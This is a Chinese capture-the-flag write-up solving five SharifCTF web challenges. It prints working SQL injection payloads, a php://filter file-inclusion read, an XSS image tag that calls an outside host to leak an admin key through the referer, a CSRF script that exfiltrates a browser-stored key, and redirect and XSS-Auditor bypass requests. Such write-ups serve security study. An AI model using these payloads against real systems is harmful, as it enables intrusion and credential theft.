##Poor guy
key: SQL 注入， $input_escaped = str_replace("'","\'",$user_input); \\取消单引号转义

进网页是一个登录页面，用给的账号和密码登陆进去，其中有一个查看图片的功能。打开源码看是一个post的表单然后读取图片。 然后表单中的值是数字，但是图片的路径不是数字，由此想到中间可能存在数据库查询。book_selection 参数会带入查询，但是一开始在这卡住了，因为随便怎么搞都找不到注入点。。。后来给出hint看到这个str_replace("'","\'",$user_input)， 只转义了单引号却没有转义反斜杠，直接在单引号前加一个\转义掉用来转义单引号的反斜杠.

payload: book_selection=9781473621640\'or 1=1#
然后就是正常的盲注，没什么难点，读出secret flag这本书的serial number就是flag



##Irish Home
key: SQL 注入，查询使用的是 " 而不是 '， 文件包含

打开网页有一个登录页面，username存在注入，但是SQL查询是使用双引号框的字符，所以要用双引号结束字符串

payload: password=1&username=-1" or 1=1# or后为真时会爆SQL注入提示，为假时提示账号不存在，然后就是正常的盲注，得到账号密码
Cuchulainn：2a7da9c@088ba43a_9c1b4Xbyd231eb9 
登录进去，发现没有flag，查看notice说的是flag.php被删除了。在admin.php页面查看功能发现有
delete.php, show.php, edit.php, show.php中存在文件包含show.php?page=blog, 用父路径跳了一下发现可以用父路径，php://filter试了下可以直接读源码。那就直接用base64读出delete.php的源码来找一下删除了之后发生了什么
http://ctf.sharif.edu:8082/pages/show.php?page=php://filter/read=convert.base64-encode/resource=../delete 
if(file_exists($fpath)) {
		rename($fpath, "deleted_3d5d9c1910e7c7/$fname");
	}
删除后的文件被移到了deleted_3d5d9c1910e7c7目录，直接读
http://ctf.sharif.edu:8082/pages/show.php?page=php://filter/read=convert.base64-encode/resource=../deleted_3d5d9c1910e7c7/flag 
得到flag.php的源码
<?php
$username = 'Cuchulainn';
$password = ;	// Oi don't save me bleedin password in a shithole loike dis.
$salt = 'd34340968a99292fb5665e';
$tmp = $username . $password . $salt;
$tmp = md5($tmp);
$flag = "SharifCTF{" . $tmp . "}";
echo $flag;
把密码加上去在本地跑一下就出来了
SharifCTF{65892135758717f9d9dfd7063d2c2281}


##JikJik
Key: img XSS, referer
注册个账号登录进去，就只有个留言板，下面写了
*JikJiks are moderated. They appear in the list after admin's approval.
很明显就是一个XSS
然后犯二了，总觉得必须要得到cookie才行。结果根本不需要，信息是在http_referer中，payload:
<img src="//xposimon.com/evil_task.php">
看referer信息：
HTTP_REFERER:http://192.168.101.58:8085/last/?key=456b7016a916a4b178dd72b947c152b7
这个是内网访问的这个站，需要把内容IP换成对应的外网IP，然后访问
http://http://ctf.sharif.edu:8085/last/?key=456b7016a916a4b178dd72b947c152b7 得到admin 的cookie，然后直接访问主页，有一个留言
flagSharifCTF{226b7016a916a4b178dd72b947c15222}
得到flag




##CBPM
KEY：csrf, localStorage, javascript代码分析
题目描述是一个cloud-based service password manager，而且admin也在使用
By the way, admin protects its machine with a strong and restrictive firewall..
说明admin不能访问其他域，或者理解成只能访问相同域的内容

进入这个系统随便注册个账号，然后登陆，在change password页面有对这个加密的解释（理解这个就好做了）
Your decrypted master encryption key (KEY) is available in your browser and its encrypted version is stored on the server. Now you can select a new master password and re-encrypt the KEY with it (you will need this new master password to access your KEY) or go further and generate a new random KEY (this requires all passwords to be re-encrypted with this new KEY in addition to encrypting the KEY with your master password). Make your decision and be patient...
意思就是注册的时候注册了一个master password, 然后一个random的KEY储存在browser里面，（localStorage里面，browser能储存的还有session strorage, 在chrome的application标签里面能看到（在console旁边））, 用这个KEY把master word加密之后储存在云端，然后下次登陆的时候输入一个master password登陆，然后从云端下载加密后的KEY，用master password解密，得到KEY储存在broweser里面。 如果登陆的master password和注册的master password相同的话，那么KEY就是最开始生成的random的KEY，但是如果不知道master password是多少，就得不到正确的KEY，然后就不能正确的解密flag中的内容。password中的内容都是用KEY加密的，所以要得到flag，就需要知道正确的KEY或者正确的master password。

然后想到admin也使用这个系统，所以在admin的browser中也储存了admin使用的KEY。思路就是随便输个master password先登录admin，只要能够通过XSS得到admin的KEY就行了。 然后admin被防火墙隔了，所以正常的XSS多半不行的。。然后就想到用csrf，让admin做一个能够改变页面的操作来显示KEY的值。
正好在list password页面上有一个添加password的操作可以改变页面，抓一个包：
POST /put.php HTTP/1.1
Host: ctf.sharif.edu:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0
Accept: application/json
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
x-csrftoken: 
Content-Type: application/json
Origin: http://ctf.sharif.edu:8081
Referer: http://ctf.sharif.edu:8081/home.php?id=eyJ0ZWFtaWQiOiI4MzEifS4xY0lmbTkuYmdIb3c1LTB6ZkJJcVVvYnVJZDJuQ29iWUpF
Content-Length: 193
Cookie: csrftoken=lgWwKy3RpnLt4CPGZUgXeMdiaL7uXUvxXzgVcN4LAKuy6lDKmuyOljzBVFqq2Q7i; KEY=9f9f5111f7b27a781f1f1ddde5ebc2dd2b796bfc7365c9c28b548e564176929f; sessionid=q61yrn6pd21lh4lm93nfnlkfo6791bjk; LOGGED_IN_USER=admin
Connection: keep-alive

{"id":"eyJ0ZWFtaWQiOiI4MzEifS4xY0lmbTkuYmdIb3c1LTB6ZkJJcVVvYnVJZDJuQ29iWUpF","prelabel":"","newlabel":"123","encpass":"830635248a750442cdaf7681c1e1c6aa","iv":"829f34abcdd91981aaf1e078ab2ee4a1"}

构造payload
<script>
var xml = new XMLHttpRequest();
xml.open("POST","/put.php",true);
xml.send('{"id":"eyJ0ZWFtaWQiOiI4MzEifS4xY0lmbTkuYmdIb3c1LTB6ZkJJcVVvYnVJZDJuQ29iWUpF","prelabel":"","newlabel":"'+localStorage.KEY+'","encpass":"830635248a750442cdaf7681c1e1c6aa","iv":"829f34abcdd91981aaf1e078ab2ee4a1"}');(注意双引号不要掉了，之前因为忘写双引号搞了好久)
</script>

在console里面 localStorage.setItem('KEY','VkZ6eERYd05kUXlIZk5BUFl1S2wyRm55TVlMVnFlSXM=',)
查看password得到flag




##ExtraSecure
Key: 绕过js重定向, 信息收集
题目描述
You can even ask the admin to sign your content! And you know he uses Chrome to browse the web.This is an extra secure service with all protections, including SQL injection protection and XSS Audit, without any vulnerability
没有SQL,XSS，进入页面发现有4个功能
  ● Sign by Yourself
  ● See List of Signatures
  ● Sign by Administrator
  ● Get the flag
先进Get the flag，发现需要admin sign 831,然后得到signature在这输入得到flag
再看Sign by Administrator, 可以输入需要sign的内容，而且会把这个sign的请求保存在服务器
请求sign “831”，看list of signatures， 没有反应。
再看Sign by Yourselef， 是给用户自己sign 的一个页面，随便输入个内容，弹出alert弹框然后重定向主页，再看signatures没有变化，说明这里是没法sign的，因为会alert，抓个sign by yourself的包，得到响应
HTTP/1.1 200 OK
Server: nginx/1.6.1
Date: Mon, 19 Dec 2016 14:41:08 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Vary: Accept-Encoding
Content-Length: 1407

<!doctype html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="x-ua-compatible" content="ie=edge">

    <title>ExtraSecure - Wait & Sign</title>
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <script src="js/index.js"></script>
    <script src="js/cookie.js"></script>
    <script>
        alert("Sorry, server is busy for a while!");
        document.location = "/index.php?id=eyJ0ZWFtaWQiOiI4MzEifS4xY0l5OWkuTzI4SDVERVpFQmxzbWZxdktxQVRCT29aWmVN";
    </script>
</head>
<body>
<div class="container">
    <div class="card">
        <h1 class="card-header">Signing in <i id="time">10</i> seconds...</h1>
        <p class="card-block">Please be patient... The content will be signed with your key soon and you will be
            redirected to the <i>list</i> page to view the results.</p>
    </div>
</div>
<script>
    var timeElem = document.getElementById('time');
    waitSeconds(timeElem, function () {
        var c = parse(document.cookie || '');
        var key = c['KEY'];
        var body = {
            //content: base64Decode("MTIzNA=="),
            content: "MTIzNA==",
            key: key,
            id: 'eyJ0ZWFtaWQiOiI4MzEifS4xY0l5OWkuTzI4SDVERVpFQmxzbWZxdktxQVRCT29aWmVN'
        };
        postForm('/sign_and_store.php', body);
    });
</script>
</body>
</html>

第一个script是alert然后重定向，第二个script看内容应该就是sign的代码。
再抓一个sign by admin的包

POST /request.php HTTP/1.1
Host: ctf.sharif.edu:8083
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://ctf.sharif.edu:8083/request.php?id=eyJ0ZWFtaWQiOiI4MzEifS4xY0l5OWkuTzI4SDVERVpFQmxzbWZxdktxQVRCT29aWmVN
Cookie: sessionid=kwux7824jpnpmd8blhisgp98u779p8tx; csrftoken=3DFrzRIN7dGj9yJ4isj81Z7cNoArZqdfEvIFyUE163KKuLF8HIbyGHy87JhNIC6h; KEY=9f9f5111f7b27a781f1f1ddde5ebc2dd2b796bfc7365c9c28b548e564176929f
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 251

content=831&id=eyJ0ZWFtaWQiOiI4MzEifS4xY0l5OWkuTzI4SDVERVpFQmxzbWZxdktxQVRCT29aWmVN&url=http%3A%2F%2Fctf.sharif.edu%3A8083%2Fwait_and_real_sign.php%3Fid%3DeyJ0ZWFtaWQiOiI4MzEifS4xY0l5OWkuTzI4SDVERVpFQmxzbWZxdktxQVRCT29aWmVN%27%2f%2f%5c%26content%3D831

发现是一个post请求而且postdata中的url是指向wait_and_real_sign.php，所以在这里就可以分析出来，实际上在request.php这个页面给admin的request是让admin在wait_and_real_sign.php页面sign这个content，content被base64加密。然后需要document.cookie作为参数，所以必须是admin sign的signature才有用，然后id就是team_id
  var body = {
            //content: base64Decode("MTIzNA=="),
            content: "MTIzNA==",
            key: key,
            id: 'eyJ0ZWFtaWQiOiI4MzEifS4xY0l5OWkuTzI4SDVERVpFQmxzbWZxdktxQVRCT29aWmVN'
        };
所以现在的问题就是怎么绕过script的重定向来让后面的sign的脚本能够正常执行，而且不能改变id，content用来sign的值
先看
document.location = "/index.php?id=eyJ0ZWFtaWQiOiI4MzEifS4xY0l5OWkuTzI4SDVERVpFQmxzbWZxdktxQVRCT29aWmVN";
如果在id最后加上一个\就可以转义"然后这段脚本报错（未关闭的字符串），这个地方的原因是因为这段javascript代码是php动态生成的，所以生成是什么样就执行成什么样,所以只要插入了\就会代入转义。和"$_GET[x]" ?x='\'是不一样的。(每一个script标签内的脚本是独立的，所以如果一个script标签的内容报错是不影响另一个script标签的内容执行的)
然后这段script无法执行，也就无alert和重定向，但是因为改变了id的值，导致后边用来sign的id的值也改变了，而且会转义'报错，后面的sign的script标签的脚本也无法执行了。。

再来看两段id的不同之处，前一个id是双引号，后面是单引号，由此就可以想到对sign的id，先把前面的单引号闭合，而且正好id换行了，则可以再用行注释把后面的转义符注释掉，就不影响结果了
所以构造出来的 id就是
id=eyJ0ZWFtaWQiOiI4MzEifS4xY0l5OWkuTzI4SDVERVpFQmxzbWZxdktxQVRCT29aWmVN'//\
然后该url编码的地方编码，最终payload：
/request.php
postdata:
content=831&id=eyJ0ZWFtaWQiOiI4MzEifS4xY0l5OWkuTzI4SDVERVpFQmxzbWZxdktxQVRCT29aWmVN&url=http%3A%2F%2Fctf.sharif.edu%3A8083%2Fwait_and_real_sign.php%3Fid%3DeyJ0ZWFtaWQiOiI4MzEifS4xY0l5OWkuTzI4SDVERVpFQmxzbWZxdktxQVRCT29aWmVN%27%2f%2f%5c%26content%3D831
然后等一会查看list of signatures，用得到的signature get flag



另外的思路：
We know that admin uses Chrome. And this browser has XSS Auditor.
Before rendering the response in the Document Object Model presented to the user, XSS auditor searches for instances of (malicious) parameters sent in the original request. If a detection is positive, the auditor is triggered and the response is "rewritten" to a non-executable state in the browser DOM.
所以如果在请求中写上第一段中的alert的语句，让其被识别成XSS攻击的语句，就可以让browser重写这段语句成不能执行的代码，所以payload：
http://ctf.sharif.edu:8083/wait_and_real_sign.php?id=my_team_id&content=699&sth=<script>alert("Sorry, server is busy for a while!");
编码：
content=831&id=eyJ0ZWFtaWQiOiI4MzEifS4xY0l5OWkuTzI4SDVERVpFQmxzbWZxdktxQVRCT29aWmVN&url=http%3A%2F%2Fctf.sharif.edu%3A8083%2Fwait_and_real_sign.php%3Fid%3DeyJ0ZWFtaWQiOiI4MzEifS4xY0l5OWkuTzI4SDVERVpFQmxzbWZxdktxQVRCT29aWmVN%26content%3D831%26sth%3d%3Cscript%3Ealert%28%22Sorry%2C+server+is+busy+for+a+while%21%22%29%3B
